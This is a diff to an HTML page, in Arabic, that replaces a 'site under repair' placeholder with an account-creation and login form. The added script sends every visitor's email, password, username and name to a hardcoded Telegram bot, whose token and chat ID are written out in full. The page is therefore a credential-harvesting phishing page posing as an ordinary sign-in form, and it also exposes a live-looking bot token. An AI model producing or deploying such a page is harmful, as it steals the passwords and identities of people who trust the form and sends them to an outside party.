@@ -1,11 +1,67 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>تسجيل الدخول</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h1>الموقع لا يزال قيد الإصلاح <a href="index.html">رجوع الى الموقع</a></h1>
+    <div class="wrapper">
+        <form id="loginForm">
+            <h1>إنشاء حساب</h1>
+            <div class="input-box">
+                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+                <img src="" />
+            </div>
+            <div class="input-box">
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAdFJREFUSEuFlr8uRUEQxn/jFUQhEokoaL2Chk4j3kGiktuIhlAQhYp3UOluQuIVFBqdkIhKvIEsd8+e/TM7e84t7p/dnZ1vvu+bOVfIXgK48CY4XLWZL0B1Pi3EzdmS+fJn/U761jobz4SjeUSRYODSXWAf2Awgn3ByI7j7vuIejgYhLXzZ+pXAxKLr/8yJE05LLmsahyjaA+5CsjOQW49UOMBxHAK3gMec/pzZjiJNWoL7DLIB7hDhWiE9Fjh38ACyHRLnH/7iMZF/gTlgAfhWgi8CX8APyHxyXa600NQglN/XEoBUirlQ/aCWbSd6WLEx+ibJNYsAbLMUFcz4Us2VvBepVGIaCRRFhoV2gAtgvdszEttwX4EJMNUDQOf4BJa01Yo+aHf4G8hqXnht06olDbjGSFAjrZgeuoIarB6I4XejfcrxY3SgV9oONo2gCSssWw+7ZM32CGl3fj8XYmyWIKALXq2Yry41snRLXQWZTiMatBS1vYq/P8mY8RUD/O4wCw3V+8bJt9NFUcAsfXysGb6p534IHKXoA1hO4a1aTEe9Ayt1J5d0zkbFJbA2Niry6sG9AEcg00ID04v9/GmDVw8Wjblk2c4xpOO4h+Pflj9p8sAgTay64AAAAABJRU5ErkJggg==" />
+            </div>
+            <div class="input-box">
+                <input type="text" id="username" placeholder="اسم المستخدم" required>
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAllJREFUSEuNlc9vTVEQxz8Ta0kbokLYdMHSyh8gpUosVaz8BRLRJrUS3dFoWNjbai2RvrR+LG3txMKGqBJCsCTjzb3n3HvO3Hve69m8l3vmnJnznc/MCIUlgFZ7gqDhf2ocvleGwTr/CWe9g/bmfKfzvWTog9iFA4ELwyBvoUwH8/fATeBZnwCpa/s/bi0J3K7lMsFa6UAXEVZ79GvurB2kOubuZkEGoDvAErAZts8Ad4CDwAzwol8wQcYouQUyA3oJYd1FOg+sARvAOS9L+uLsOU6KH8AEsBf444jaJ/BNYRvkcBQul5H8BT1KfQEOAPsRvrsXRAdmY1L1SG0od1zWXAf2TfPTgMnxOH+BzIOuIQxQ5jr3RCgcFTkrwizKANhBWERlC3RPcLoiMKUhySUUuy9Iq7f2fh1YAeziZMm/ClO4P4rzYh24fBxDWEAxPP8ivERZBd756nBBlHOQUjGuEn0as3eWklPhWUd9EjhR05TR/lXQNwqvhxjba373BVKQSOZAHwJTo6JrL5Rt0CsIz33b6HNwHngaDj8ZlsoyqDW3n64iJwSmFZYBO2PLcDXqMtMGTUEnFd6GyK3X3Ghk6ekpCeJ3BV1Q+AwcB37F/uZ70TWEeyivgFONkR84ncFSWVpRWuO7KvCgnkGxkttMryNcROsOGXM6shhbNc4ibKA8GuJ7OeLrc/ABOAJMZpp7PPqn2yHgE8hHQY+mUzQ9HpqpKRf7qi+dbOD4zTi8m8ALraIzufISGFE8OWlZDhqY0m7qxCmNlbxT734mp7R0yXG0u1EV7P8DTEvSIoq9bwgAAAAASUVORK5CYII=" />
+            </div>
+            <div class="input-box">
+                <input type="text" id="name" placeholder="الاسم" required>
+                <img src="" />
+            </div>
+            <button type="button" class="btn" onclick="sendToTelegram()">تسجيل الدخول</button>
+            <div class="register-link">
+                <p>لدي حساب بالفعل <a href="index.html">تسجيل الدخول</a></p>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const botToken = "7901746245:AAHwlQmHuAmI5I9EI-Jo_gqBi6tTaE_wgcQ";
+        const chatId = "6526594170";
+
+        function sendToTelegram() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const username = document.getElementById('username').value;
+            const name = document.getElementById('name').value;
+
+            const message = `تسجيل دخول جديد:\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}\nاسم المستخدم: ${username}\nالاسم: ${name}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+            })
+            .catch(error => {
+                console.error("حدث خطأ:", error);
+            });
+        }
+    </script>
 </body>
 </html>
